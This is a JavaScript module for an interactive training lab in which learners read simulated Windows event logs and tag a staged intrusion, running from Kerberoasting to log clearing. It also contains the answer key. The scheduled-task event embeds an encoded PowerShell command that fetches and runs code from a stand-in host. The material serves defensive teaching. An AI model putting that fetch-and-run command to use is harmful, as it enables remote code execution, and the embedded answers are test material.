window.CP = window.CP || {};
CP.labs = CP.labs || [];
CP.labs.push({
  id: "lab-windows-events",
  title: "Windows Event Viewer: Reading the Attacker's Footprints",
  module: "p2-m2",
  difficulty: "Intermediate",
  minutes: 30,
  skills: ["Windows Event Viewer", "Security & System logs", "event XML", "Kerberos events", "persistence & defense evasion"],
  briefing: `
    <p><b>Scenario:</b> An EDR alert on <code>WS-ENG-11</code> (user <code>tbrooks</code>) was escalated to you. The IR lead has pulled the
    <i>Forwarded Events</i> log (Security + System channels from the domain controller, a SQL server and the workstation) for the 90 minutes
    around the alert. About 60 events are shown; <b>8 events are flagged &#9733;</b> for your review.</p>
    <p><b>Objectives:</b></p>
    <ul>
      <li>Navigate an Event Viewer-style list and read both the friendly <i>General</i> view and the raw <i>XML</i> view.</li>
      <li>For each flagged event, choose the correct interpretation. Some flagged events may be benign - read the fields, not just the Event ID.</li>
      <li>Explain how the flagged events fit together into an attack story.</li>
    </ul>
    <div class="callout tip">Key fields: <code>TicketEncryptionType</code> on 4769 (0x17 = RC4-HMAC, 0x12 = AES256), <code>ServiceName</code>,
    <code>ImagePath</code> on 7045, <code>MemberSid</code>/<code>TargetUserName</code> on 4732, and <code>SubjectUserName</code> (who did it) versus
    <code>TargetUserName</code> (who it was done to).</div>
    <div class="callout exam">Expect Security+/CySA+/SC-200 questions that give you an Event ID and ask what it indicates. Memorise 4624, 4625, 4648, 4672,
    4688, 4720, 4732, 4768, 4769, 4698, 7045 and 1102.</div>
  `,
  render(container, ctx) {
    const esc = ctx.escape;
    container.classList.add("lab-lab-windows-events");

    let seed = 7045;
    const rnd = () => { seed = (seed * 16807) % 2147483647; return (seed - 1) / 2147483646; };
    const ri = (a, b) => a + Math.floor(rnd() * (b - a + 1));
    const pick = (a) => a[Math.floor(rnd() * a.length)];
    const pad = (n) => String(n).padStart(2, "0");
    const START = 22 * 3600;
    const fmtLocal = (s) => `10/14/2025 ${((Math.floor(s / 3600) + 11) % 12) + 1}:${pad(Math.floor(s % 3600 / 60))}:${pad(s % 60)} ${s >= 12 * 3600 ? "PM" : "AM"}`;
    const fmtIso = (s) => `2025-10-14T${pad(Math.floor(s / 3600))}:${pad(Math.floor(s % 3600 / 60))}:${pad(s % 60)}.${String(ri(100000, 999999))}Z`;

    const DC = "DC01.corp.example.com", SQL = "SQL-02.corp.example.com", WS = "WS-ENG-11.corp.example.com";
    const PROV = {
      sec: ["Microsoft-Windows-Security-Auditing", "{54849625-5478-4994-a5ba-3e3b0328c30d}"],
      scm: ["Service Control Manager", "{555908d1-a6d7-4695-8e1e-26931d2012f4}"],
      evl: ["Microsoft-Windows-Eventlog", "{fc65ddd8-d6ef-4962-83d5-6e5cfe9ce148}"]
    };
    const CAT = { 4624: "Logon", 4625: "Logon", 4634: "Logoff", 4648: "Logon", 4672: "Special Logon", 4720: "User Account Management", 4732: "Security Group Management",
      4768: "Kerberos Authentication Service", 4769: "Kerberos Service Ticket Operations", 4776: "Credential Validation", 4698: "Other Object Access Events",
      1102: "Log clear", 7045: "None", 7036: "None" };
    const events = [];
    const add = (t, id, computer, data, extra) => {
      const p = id === 1102 ? PROV.evl : (id === 7045 || id === 7036) ? PROV.scm : PROV.sec;
      events.push(Object.assign({ t, id, computer, data, provider: p[0], guid: p[1], channel: (id === 7045 || id === 7036) ? "System" : "Security",
        level: id === 4625 ? "Information" : "Information", keywords: id === 4625 ? "Audit Failure" : (id === 7045 || id === 7036) ? "Classic" : "Audit Success" }, extra || {}));
    };
    const users = [["kchen", "10.10.20.52", "WS-FIN-02"], ["lpark", "10.10.30.13", "WS-HR-03"], ["tbrooks", "10.10.40.21", "WS-ENG-11"], ["mali", "10.10.40.24", "WS-ENG-14"], ["jortiz", "10.10.50.15", "WS-SALES-05"]];

    // ---- background noise ----
    for (let i = 0; i < 46; i++) {
      const t = START + ri(0, 5300), u = pick(users), r = rnd();
      if (r < 0.2) add(t, 4624, pick([DC, SQL]), { SubjectUserSid: "S-1-0-0", TargetUserName: u[0], TargetDomainName: "CORP", LogonType: "3", WorkstationName: u[2], IpAddress: u[1], AuthenticationPackageName: "Kerberos", LogonProcessName: "Kerberos" });
      else if (r < 0.32) add(t, 4634, pick([DC, SQL]), { TargetUserName: u[0], TargetDomainName: "CORP", LogonType: "3" });
      else if (r < 0.5) add(t, 4768, DC, { TargetUserName: u[0], TargetDomainName: "CORP.EXAMPLE.COM", ServiceName: "krbtgt", TicketOptions: "0x40810010", Status: "0x0", TicketEncryptionType: "0x12", PreAuthType: "2", IpAddress: "::ffff:" + u[1] });
      else if (r < 0.75) add(t, 4769, DC, { TargetUserName: u[0] + "@CORP.EXAMPLE.COM", TargetDomainName: "CORP.EXAMPLE.COM", ServiceName: pick(["FS-01$", "SQL-02$", "DC01$", "PRINT-01$"]), TicketOptions: "0x40810000", TicketEncryptionType: "0x12", IpAddress: "::ffff:" + u[1], Status: "0x0" });
      else if (r < 0.85) add(t, 4672, DC, { SubjectUserName: "svc_backup", SubjectDomainName: "CORP", PrivilegeList: "SeBackupPrivilege\n\t\t\tSeRestorePrivilege\n\t\t\tSeSecurityPrivilege" });
      else if (r < 0.95) add(t, 7036, pick([SQL, WS]), { param1: pick(["Windows Update", "Background Intelligent Transfer Service", "Windows Modules Installer", "WinHTTP Web Proxy Auto-Discovery Service"]), param2: pick(["running", "stopped"]) });
      else add(t, 4776, DC, { PackageName: "MICROSOFT_AUTHENTICATION_PACKAGE_V1_0", TargetUserName: u[0], Workstation: u[2], Status: "0x0" });
    }
    add(START + 1300, 4625, DC, { TargetUserName: "lpark", TargetDomainName: "CORP", Status: "0xc000006d", SubStatus: "0xc000006a", LogonType: "3", WorkstationName: "WS-HR-03", IpAddress: "10.10.30.13", FailureReason: "%%2313" });

    // ---- the flagged events ----
    const B64 = "SQBFAFgAIAAoAEkAdwByACAAaAB0AHQAcABzADoALwAvAGMAZABuAC0AcwB5AG4AYwAtAGEAcABpAC4AZQB4AGEAbQBwAGwAZQAvAGgAKQA=";
    const FLAG = [
      { t: START + 1810, id: 4769, c: DC, data: { TargetUserName: "tbrooks@CORP.EXAMPLE.COM", TargetDomainName: "CORP.EXAMPLE.COM", ServiceName: "svc_sql", ServiceSid: "S-1-5-21-3623811015-3361044348-30300820-1609", TicketOptions: "0x40810000", TicketEncryptionType: "0x17", IpAddress: "::ffff:10.10.40.21", IpPort: "51602", Status: "0x0" },
        ans: "kerb", why: "A service ticket for a <b>user</b> service account (svc_sql, not a computer$ account) requested with <b>RC4-HMAC (0x17)</b> when the domain normally issues AES (0x12) - the classic Kerberoasting pattern (T1558.003). The attacker will crack the ticket offline to recover svc_sql's password." },
      { t: START + 1795, id: 4769, c: DC, data: { TargetUserName: "tbrooks@CORP.EXAMPLE.COM", TargetDomainName: "CORP.EXAMPLE.COM", ServiceName: "FS-01$", TicketOptions: "0x40810000", TicketEncryptionType: "0x12", IpAddress: "::ffff:10.10.40.21", IpPort: "51588", Status: "0x0" },
        ans: "kerbok", why: "Same user and Event ID, but this ticket is for a computer account (FS-01$, mapping a file share) and uses <b>AES256 (0x12)</b>. This is normal Kerberos traffic - the encryption type and service name are what separate it from Kerberoasting." },
      { t: START + 2420, id: 4648, c: WS, data: { SubjectUserName: "tbrooks", SubjectDomainName: "CORP", TargetUserName: "svc_sql", TargetDomainName: "CORP", TargetServerName: "SQL-02.corp.example.com", TargetInfo: "SQL-02.corp.example.com", ProcessName: "C:\\Users\\tbrooks\\AppData\\Local\\Temp\\PsExec64.exe", IpAddress: "-", IpPort: "-" },
        ans: "explicit", why: "4648 means a process logged on using <b>explicitly supplied credentials</b> (like runas or PsExec -u). tbrooks' session used <b>svc_sql</b>'s password (just cracked from the Kerberoast) to reach SQL-02 via PsExec from %TEMP% (T1078 Valid Accounts, T1569.002)." },
      { t: START + 2431, id: 7045, c: SQL, data: { ServiceName: "PSEXESVC", ImagePath: "%SystemRoot%\\PSEXESVC.exe", ServiceType: "user mode service", StartType: "demand start", AccountName: "LocalSystem" },
        ans: "service", why: "A new service was installed on SQL-02. PSEXESVC is created by PsExec when it executes remotely (T1569.002 Service Execution / T1021.002). Admins do use PsExec, but here it follows a Kerberoast and an explicit-credential logon from a non-admin's workstation." },
      { t: START + 2910, id: 4720, c: DC, data: { TargetUserName: "helpdesk_tmp", TargetDomainName: "CORP", TargetSid: "S-1-5-21-3623811015-3361044348-30300820-1642", SubjectUserName: "svc_sql", SubjectDomainName: "CORP", SamAccountName: "helpdesk_tmp", UserAccountControl: "%%2080 %%2082 %%2084", PasswordLastSet: "10/14/2025 10:48:30 PM" },
        ans: "created", why: "A new domain user <b>helpdesk_tmp</b> was created - by <b>svc_sql</b>, a service account that should never create users. Attackers create accounts for persistence (T1136.002 Domain Account)." },
      { t: START + 2944, id: 4732, c: DC, data: { MemberName: "-", MemberSid: "S-1-5-21-3623811015-3361044348-30300820-1642", TargetUserName: "Administrators", TargetDomainName: "Builtin", TargetSid: "S-1-5-32-544", SubjectUserName: "svc_sql", SubjectDomainName: "CORP", PrivilegeList: "-" },
        ans: "admin", why: "The new account's SID (...-1642 = helpdesk_tmp) was added to <b>BUILTIN\\Administrators</b> (S-1-5-32-544) on the domain controller - effectively domain-level admin rights (T1098 Account Manipulation)." },
      { t: START + 3400, id: 4698, c: SQL, data: { SubjectUserName: "helpdesk_tmp", SubjectDomainName: "CORP", TaskName: "\\Microsoft\\Windows\\Maintenance\\SysHealthCheck",
        TaskContent: "<Task><Triggers><BootTrigger/></Triggers><Principals><Principal><UserId>S-1-5-18</UserId></Principal></Principals><Actions><Exec><Command>powershell.exe</Command><Arguments>-nop -w hidden -enc " + B64 + "</Arguments></Exec></Actions></Task>" },
        ans: "task", why: "A scheduled task that runs hidden, encoded PowerShell as SYSTEM at boot, hidden under a legitimate-looking \\Microsoft\\Windows\\Maintenance path - persistence (T1053.005). The base64 decodes to IEX (Iwr https://cdn-sync-api.example/h)." },
      { t: START + 4980, id: 1102, c: DC, data: { SubjectUserName: "helpdesk_tmp", SubjectDomainName: "CORP", SubjectLogonId: "0x3e7a91" },
        ans: "cleared", why: "The Security log was cleared by helpdesk_tmp - anti-forensics (T1070.001 Clear Windows Event Logs). Event 1102 is written <i>after</i> the clear, so it survives; this is why central log forwarding matters." }
    ];
    FLAG.forEach((f, i) => add(f.t, f.id, f.c, f.data, { flag: i }));
    // a couple of supporting non-flagged events around the attack
    add(START + 2432, 7036, SQL, { param1: "PSEXESVC", param2: "running" });
    add(START + 2425, 4624, SQL, { TargetUserName: "svc_sql", TargetDomainName: "CORP", LogonType: "3", WorkstationName: "WS-ENG-11", IpAddress: "10.10.40.21", AuthenticationPackageName: "NTLM", LogonProcessName: "NtLmSsp" });
    add(START + 2426, 4672, SQL, { SubjectUserName: "svc_sql", SubjectDomainName: "CORP", PrivilegeList: "SeDebugPrivilege\n\t\t\tSeImpersonatePrivilege\n\t\t\tSeTakeOwnershipPrivilege" });

    events.sort((a, b) => b.t - a.t);
    events.forEach((e, i) => { e.n = i; e.rec = 884210 + (events.length - i) * ri(1, 3); });

    const OPTS = [
      ["", "- choose interpretation -"],
      ["cleared", "Log cleared (1102)"],
      ["service", "New service installed (7045)"],
      ["admin", "Account added to admin group (4732)"],
      ["explicit", "Explicit credential logon (4648)"],
      ["kerb", "Kerberoasting indicator (4769 RC4 0x17)"],
      ["kerbok", "Normal Kerberos service ticket (4769 AES 0x12)"],
      ["created", "User account created (4720)"],
      ["task", "Scheduled task created - persistence (4698)"],
      ["locked", "Account locked out (4740)"],
      ["priv", "Special privileges assigned to new logon (4672)"],
      ["audit", "Audit policy changed (4719)"],
      ["rdp", "Successful RDP logon (4624 type 10)"]
    ];

    function message(e) {
      const d = e.data;
      switch (e.id) {
        case 4624: return `An account was successfully logged on.\n\nLogon Information:\n\tLogon Type:\t\t${d.LogonType}\n\nNew Logon:\n\tAccount Name:\t\t${d.TargetUserName}\n\tAccount Domain:\t\t${d.TargetDomainName}\n\nNetwork Information:\n\tWorkstation Name:\t${d.WorkstationName}\n\tSource Network Address:\t${d.IpAddress}\n\nDetailed Authentication Information:\n\tLogon Process:\t\t${d.LogonProcessName}\n\tAuthentication Package:\t${d.AuthenticationPackageName}`;
        case 4625: return `An account failed to log on.\n\nLogon Type:\t\t\t${d.LogonType}\n\nAccount For Which Logon Failed:\n\tAccount Name:\t\t${d.TargetUserName}\n\nFailure Information:\n\tFailure Reason:\t\tUnknown user name or bad password.\n\tStatus:\t\t\t${d.Status}\n\tSub Status:\t\t${d.SubStatus}\n\nNetwork Information:\n\tWorkstation Name:\t${d.WorkstationName}\n\tSource Network Address:\t${d.IpAddress}`;
        case 4634: return `An account was logged off.\n\nSubject:\n\tAccount Name:\t\t${d.TargetUserName}\n\tAccount Domain:\t\t${d.TargetDomainName}\n\nLogon Type:\t\t\t${d.LogonType}`;
        case 4648: return `A logon was attempted using explicit credentials.\n\nSubject:\n\tAccount Name:\t\t${d.SubjectUserName}\n\tAccount Domain:\t\t${d.SubjectDomainName}\n\nAccount Whose Credentials Were Used:\n\tAccount Name:\t\t${d.TargetUserName}\n\tAccount Domain:\t\t${d.TargetDomainName}\n\nTarget Server:\n\tTarget Server Name:\t${d.TargetServerName}\n\nProcess Information:\n\tProcess Name:\t\t${d.ProcessName}`;
        case 4672: return `Special privileges assigned to new logon.\n\nSubject:\n\tAccount Name:\t\t${d.SubjectUserName}\n\tAccount Domain:\t\t${d.SubjectDomainName}\n\nPrivileges:\t\t${d.PrivilegeList}`;
        case 4720: return `A user account was created.\n\nSubject:\n\tAccount Name:\t\t${d.SubjectUserName}\n\tAccount Domain:\t\t${d.SubjectDomainName}\n\nNew Account:\n\tSecurity ID:\t\t${d.TargetSid}\n\tAccount Name:\t\t${d.TargetUserName}\n\tAccount Domain:\t\t${d.TargetDomainName}\n\nAttributes:\n\tSAM Account Name:\t${d.SamAccountName}\n\tPassword Last Set:\t${d.PasswordLastSet}`;
        case 4732: return `A member was added to a security-enabled local group.\n\nSubject:\n\tAccount Name:\t\t${d.SubjectUserName}\n\tAccount Domain:\t\t${d.SubjectDomainName}\n\nMember:\n\tSecurity ID:\t\t${d.MemberSid}\n\tAccount Name:\t\t${d.MemberName}\n\nGroup:\n\tSecurity ID:\t\t${d.TargetSid}\n\tGroup Name:\t\t${d.TargetUserName}\n\tGroup Domain:\t\t${d.TargetDomainName}`;
        case 4768: return `A Kerberos authentication ticket (TGT) was requested.\n\nAccount Information:\n\tAccount Name:\t\t${d.TargetUserName}\n\tSupplied Realm Name:\t${d.TargetDomainName}\n\nService Information:\n\tService Name:\t\t${d.ServiceName}\n\nNetwork Information:\n\tClient Address:\t\t${d.IpAddress}\n\nAdditional Information:\n\tTicket Options:\t\t${d.TicketOptions}\n\tResult Code:\t\t${d.Status}\n\tTicket Encryption Type:\t${d.TicketEncryptionType}\n\tPre-Authentication Type:\t${d.PreAuthType}`;
        case 4769: return `A Kerberos service ticket was requested.\n\nAccount Information:\n\tAccount Name:\t\t${d.TargetUserName}\n\tAccount Domain:\t\t${d.TargetDomainName}\n\nService Information:\n\tService Name:\t\t${d.ServiceName}\n\nNetwork Information:\n\tClient Address:\t\t${d.IpAddress}\n\nAdditional Information:\n\tTicket Options:\t\t${d.TicketOptions}\n\tTicket Encryption Type:\t${d.TicketEncryptionType}\n\tFailure Code:\t\t${d.Status}`;
        case 4776: return `The computer attempted to validate the credentials for an account.\n\nAuthentication Package:\t${d.PackageName}\nLogon Account:\t${d.TargetUserName}\nSource Workstation:\t${d.Workstation}\nError Code:\t${d.Status}`;
        case 4698: return `A scheduled task was created.\n\nSubject:\n\tAccount Name:\t\t${d.SubjectUserName}\n\tAccount Domain:\t\t${d.SubjectDomainName}\n\nTask Information:\n\tTask Name:\t\t${d.TaskName}\n\tTask Content:\t\t${d.TaskContent}`;
        case 1102: return `The audit log was cleared.\nSubject:\n\tAccount Name:\t${d.SubjectUserName}\n\tDomain Name:\t${d.SubjectDomainName}\n\tLogon ID:\t${d.SubjectLogonId}`;
        case 7045: return `A service was installed in the system.\n\nService Name:  ${d.ServiceName}\nService File Name:  ${d.ImagePath}\nService Type:  ${d.ServiceType}\nService Start Type:  ${d.StartType}\nService Account:  ${d.AccountName}`;
        case 7036: return `The ${d.param1} service entered the ${d.param2} state.`;
      }
      return "";
    }
    const xmlEsc = (s) => String(s).replace(/&/g, "&amp;").replace(/</g, "&lt;").replace(/>/g, "&gt;").replace(/"/g, "&quot;");
    function xml(e) {
      const isUser = e.id === 1102;
      const body = isUser
        ? `  <UserData>\n    <LogFileCleared xmlns="http://manifests.microsoft.com/win/2004/08/windows/eventlog">\n${Object.keys(e.data).map((k) => `      <${k}>${xmlEsc(e.data[k])}</${k}>`).join("\n")}\n    </LogFileCleared>\n  </UserData>`
        : `  <EventData>\n${Object.keys(e.data).map((k) => `    <Data Name="${k}">${xmlEsc(e.data[k])}</Data>`).join("\n")}\n  </EventData>`;
      return `<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
  <System>
    <Provider Name="${e.provider}" Guid="${e.guid}" />
    <EventID>${e.id}</EventID>
    <Version>${e.id === 4769 || e.id === 4624 ? 2 : 0}</Version>
    <Level>${e.channel === "System" ? 4 : 0}</Level>
    <Task>${{ 4624: 12544, 4625: 12544, 4634: 12545, 4648: 12544, 4672: 12548, 4720: 13824, 4732: 13826, 4768: 14339, 4769: 14337, 4776: 14336, 4698: 12804, 1102: 104 }[e.id] || 0}</Task>
    <Keywords>${e.keywords === "Audit Failure" ? "0x8010000000000000" : e.keywords === "Audit Success" ? "0x8020000000000000" : "0x8080000000000000"}</Keywords>
    <TimeCreated SystemTime="${e.iso || (e.iso = fmtIso(e.t))}" />
    <EventRecordID>${e.rec}</EventRecordID>
    <Channel>${e.channel}</Channel>
    <Computer>${e.computer}</Computer>
    <Security />
  </System>
${body}
</Event>`;
    }

    // ---------- UI ----------
    const style = document.createElement("style");
    style.textContent = `
      .lab-lab-windows-events .we-grid { display:grid; grid-template-columns: minmax(0, 1fr) minmax(0, 1fr); gap:12px; }
      @media (max-width: 1000px) { .lab-lab-windows-events .we-grid { grid-template-columns: 1fr; } }
      .lab-lab-windows-events .we-list { max-height: 430px; overflow:auto; border:1px solid var(--border); border-radius:8px; }
      .lab-lab-windows-events .we-list table { width:100%; font-size:.8em; }
      .lab-lab-windows-events .we-list th { position: sticky; top:0; background: var(--surface); text-align:left; }
      .lab-lab-windows-events .we-list td { white-space:nowrap; }
      .lab-lab-windows-events .we-list tbody tr { cursor:pointer; }
      .lab-lab-windows-events .we-list tr.we-flag td { background: color-mix(in srgb, var(--warn) 14%, transparent); }
      .lab-lab-windows-events .we-list tr.we-sel td { background: color-mix(in srgb, var(--accent) 25%, transparent); }
      .lab-lab-windows-events .we-detail pre { white-space: pre-wrap; word-break: break-all; font-size:.8em; background: var(--code-bg); padding:10px; border-radius:6px; max-height: 330px; overflow:auto; margin:0; tab-size: 4; }
      .lab-lab-windows-events .we-tabs button.active { border-color: var(--accent); color: var(--accent); }
      .lab-lab-windows-events .we-tagrow { display:grid; grid-template-columns: 2.2em minmax(0,1.3fr) minmax(0,2fr); gap:8px; align-items:center; padding:8px 0; border-bottom:1px solid var(--border); }
      .lab-lab-windows-events .we-tagrow:last-child { border-bottom:0; }
      .lab-lab-windows-events .we-tagrow .select { width:100%; }
      .lab-lab-windows-events .we-fb { grid-column: 2 / -1; font-size:.88em; }
      .lab-lab-windows-events .we-meta { display:grid; grid-template-columns: max-content 1fr max-content 1fr; gap:2px 12px; font-size:.82em; margin-bottom:8px; }
      .lab-lab-windows-events .we-filter { display:flex; gap:8px; flex-wrap:wrap; align-items:center; }
    `;
    container.appendChild(style);

    container.insertAdjacentHTML("beforeend", `
      <div class="stack">
        <div class="we-filter">
          <select class="select" data-el="fchan" aria-label="Channel"><option value="">All channels</option><option>Security</option><option>System</option></select>
          <input class="input" data-el="fid" placeholder="Filter Event IDs, e.g. 4769,7045" style="width:220px" aria-label="Event ID filter">
          <label class="muted"><input type="checkbox" data-el="fflag"> Flagged only</label>
          <span class="muted" data-el="count"></span>
        </div>
        <div class="we-grid">
          <div class="we-list"><table class="table"><thead><tr><th></th><th>Level</th><th>Date and Time</th><th>Source</th><th>Event ID</th><th>Task Category</th><th>Computer</th></tr></thead><tbody data-el="list"></tbody></table></div>
          <div class="card we-detail">
            <div class="row we-tabs"><button class="btn ghost active" data-tab="general" type="button">General</button><button class="btn ghost" data-tab="xml" type="button">XML View</button><span class="muted" data-el="flagnote"></span></div>
            <div data-el="meta" class="we-meta" style="margin-top:8px"></div>
            <pre class="mono" data-el="body">Select an event in the list.</pre>
          </div>
        </div>
        <div class="card">
          <h3 style="margin-top:0">Tag the flagged events</h3>
          <div data-el="tags"></div>
          <div class="row" style="margin-top:10px"><button class="btn primary" data-el="check" type="button">Check tags</button><span class="muted" data-el="prog"></span></div>
          <div data-el="result" style="margin-top:8px"></div>
        </div>
      </div>`);
    const $ = (s) => container.querySelector(`[data-el="${s}"]`);
    let sel = null, tab = "general";

    function drawList() {
      const ch = $("fchan").value, ids = $("fid").value.split(/[\s,]+/).filter(Boolean), fo = $("fflag").checked;
      const rows = events.filter((e) => (!ch || e.channel === ch) && (!ids.length || ids.includes(String(e.id))) && (!fo || e.flag !== undefined));
      $("count").textContent = `Number of events: ${rows.length}`;
      $("list").innerHTML = rows.map((e) => `<tr data-n="${e.n}" class="${e.flag !== undefined ? "we-flag" : ""}${sel === e.n ? " we-sel" : ""}">
        <td>${e.flag !== undefined ? `<span title="Flagged for review">&#9733;${e.flag + 1}</span>` : ""}</td>
        <td>${e.keywords === "Audit Failure" ? "&#128274; Audit Failure" : e.keywords === "Audit Success" ? "&#128273; Audit Success" : "&#8505; Information"}</td>
        <td>${esc(fmtLocal(e.t))}</td><td>${esc(e.provider.replace("Microsoft-Windows-", ""))}</td><td>${e.id}</td><td>${esc(CAT[e.id] || "None")}</td><td>${esc(e.computer.split(".")[0])}</td></tr>`).join("");
    }
    function drawDetail() {
      const e = events.find((x) => x.n === sel);
      if (!e) return;
      $("flagnote").textContent = e.flag !== undefined ? `Flagged event #${e.flag + 1}` : "";
      $("meta").innerHTML = [["Log Name", e.channel], ["Source", e.provider], ["Event ID", e.id], ["Task Category", CAT[e.id] || "None"], ["Logged", fmtLocal(e.t)], ["Keywords", e.keywords], ["Computer", e.computer], ["Record", e.rec]]
        .map(([k, v]) => `<span class="muted">${esc(k)}:</span><span>${esc(String(v))}</span>`).join("");
      $("body").textContent = tab === "general" ? message(e) : xml(e);
    }
    function select(n) { sel = n; drawList(); drawDetail(); const tr = container.querySelector(`tr[data-n="${n}"]`); if (tr) tr.scrollIntoView({ block: "nearest" }); }
    $("list").addEventListener("click", (ev) => { const tr = ev.target.closest("tr"); if (tr) select(+tr.dataset.n); });
    container.querySelector(".we-tabs").addEventListener("click", (ev) => {
      const b = ev.target.closest("[data-tab]"); if (!b) return;
      tab = b.dataset.tab;
      container.querySelectorAll(".we-tabs [data-tab]").forEach((x) => x.classList.toggle("active", x === b));
      drawDetail();
    });
    ["fchan", "fid", "fflag"].forEach((k) => $(k).addEventListener(k === "fid" ? "input" : "change", drawList));
    drawList();

    const tagsEl = $("tags");
    FLAG.forEach((f, i) => {
      const e = events.find((x) => x.flag === i);
      const d = document.createElement("div");
      d.className = "we-tagrow";
      d.innerHTML = `<b>&#9733;${i + 1}</b>
        <div><button class="btn ghost" type="button" data-view="${e.n}">View</button> <span class="mono">${f.id}</span> <span class="muted">${esc(e.computer.split(".")[0])} &middot; ${esc(fmtLocal(e.t).split(" ").slice(1).join(" "))}</span></div>
        <select class="select" data-tag="${i}" aria-label="Interpretation for flagged event ${i + 1}">${OPTS.map((o) => `<option value="${o[0]}">${esc(o[1])}</option>`).join("")}</select>
        <div class="we-fb" data-fb="${i}"></div>`;
      tagsEl.appendChild(d);
    });
    tagsEl.addEventListener("click", (ev) => { const b = ev.target.closest("[data-view]"); if (b) select(+b.dataset.view); });
    const prog = () => { $("prog").textContent = `${[...tagsEl.querySelectorAll("[data-tag]")].filter((s) => s.value).length}/${FLAG.length} tagged`; };
    tagsEl.addEventListener("change", prog); prog();
    select(events.find((x) => x.flag === 0).n);

    let done = false;
    $("check").addEventListener("click", () => {
      let correct = 0, answered = 0;
      FLAG.forEach((f, i) => {
        const v = tagsEl.querySelector(`[data-tag="${i}"]`).value;
        const fb = tagsEl.querySelector(`[data-fb="${i}"]`);
        if (!v) { fb.innerHTML = `<span class="tag warn">not tagged</span>`; return; }
        answered++;
        const ok = v === f.ans;
        if (ok) correct++;
        fb.innerHTML = `<span class="tag ${ok ? "good" : "bad"}">${ok ? "Correct" : "Incorrect"}</span> ${ok ? f.why : "Open the event and read its fields (try the XML view)."}`;
      });
      if (answered < FLAG.length) { $("result").innerHTML = `<div class="alert info">${correct}/${answered} correct so far - tag all ${FLAG.length} flagged events to finish.</div>`; return; }
      const score = Math.round(correct / FLAG.length * 100);
      FLAG.forEach((f, i) => {
        const fb = tagsEl.querySelector(`[data-fb="${i}"]`);
        if (!fb.innerHTML.includes("Correct")) fb.innerHTML = `<span class="tag bad">Incorrect</span> Correct: <b>${esc(OPTS.find((o) => o[0] === f.ans)[1])}</b>. ${f.why}`;
      });
      $("result").innerHTML = `<div class="alert ${score >= 70 ? "good" : "bad"}"><b>Score: ${score}%</b> (${correct}/${FLAG.length}).
        <div style="margin-top:6px"><b>The story:</b> tbrooks' compromised workstation requested an RC4 ticket for svc_sql (Kerberoasting, &#9733;1) &rarr;
        the cracked password was used explicitly with PsExec (&#9733;3) &rarr; PSEXESVC installed on SQL-02 (&#9733;4) &rarr; svc_sql created helpdesk_tmp (&#9733;5)
        and added it to Administrators on the DC (&#9733;6) &rarr; helpdesk_tmp planted a SYSTEM scheduled task (&#9733;7) and cleared the Security log (&#9733;8).
        &#9733;2 was ordinary AES Kerberos traffic. <b>Recommended detections:</b> 4769 with 0x17 for user SPNs; 7045 with PSEXESVC or cmd/powershell ImagePaths;
        4732 to privileged groups; any 1102.</div></div>`;
      if (!done) { done = true; ctx.complete(score); }
    });
    container._cpCount = events.length;
  }
});
